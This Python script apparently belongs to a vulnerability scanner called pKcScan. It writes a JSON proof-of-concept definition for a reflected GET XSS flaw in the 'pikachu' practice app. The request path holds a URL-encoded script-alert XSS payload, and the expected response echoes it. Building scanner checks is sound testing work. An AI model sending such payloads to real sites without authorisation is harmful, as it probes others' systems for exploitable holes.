# pKcScan © 2024.7.11 by cer1cc is licensed under CC BY-NC-SA 4.0 
import json

# 模板
template = {
  "name": "pikachu",
  "vuln":"反射型xss(get)",
  "version": "",
  "comment": "仅需要多次发包验证的设置mainRequest字段2,否则都以1为准,多次发包依次延续",
  "type":"1",
  "mainRequest": {
    "1": {
      "request": {
        "host": "",
        "method": "",
        "path": "",
        "cookie": "",
        "requestheader": "",
        "requestbody": ""
      },
      "response": {
        "statuscode": "",
        "statusmessage": "",
        "responsetime": "",
        "responseheader": "",
        "responsebody": ""
      }
    }
  }
}


# 新数据
new_data = {
    "request": {
      "host": "",
      "method": "GET",
      "path": "/vul/xss/xss_reflected_get.php?message=%3cscript%3ealert('xss')%3c%2fscript%3e&submit=submit",
      "cookie": "",
      "requestheader": "",
      "requestbody": ""
    },
    "response": {
      "statuscode": 200,
      "statusmessage": "",
      "responsetime": "",
      "responseheader": "",
      "responsebody": "<p class='notice'>who is <script>alert('xss')</script>,i don't care!</p>"
  }
}
  

  

# 将新数据填入模板
template["mainRequest"]["1"]["request"] = new_data["request"]
template["mainRequest"]["1"]["response"] = new_data["response"]

# 将结果写入文件
output_file_path = rf"/home/qwe/VScode/pKcScan/module/Poc/pikachu/{template["vuln"]}.json"
with open(output_file_path, 'w', encoding='utf-8') as file:
    json.dump(template, file, indent=4, ensure_ascii=False)

print(f"填充后的 JSON 数据已写入文件: {output_file_path}")
